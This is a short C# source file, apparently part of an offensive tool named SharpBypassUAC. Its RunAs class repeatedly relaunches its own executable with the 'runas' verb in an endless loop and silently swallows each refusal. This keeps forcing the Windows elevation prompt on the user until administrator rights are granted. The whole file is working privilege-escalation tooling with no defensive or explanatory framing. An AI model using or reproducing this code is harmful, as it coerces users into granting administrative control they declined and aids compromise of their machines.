using System;
using System.Diagnostics;

namespace SharpBypassUAC;

public class RunAs
{
	public RunAs()
	{
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			FileName = Process.GetCurrentProcess().MainModule.FileName,
			Verb = "runas"
		};
		while (true)
		{
			try
			{
				Process process = new Process();
				process.StartInfo = startInfo;
				process.Start();
				Environment.Exit(0);
			}
			catch
			{
			}
		}
	}
}
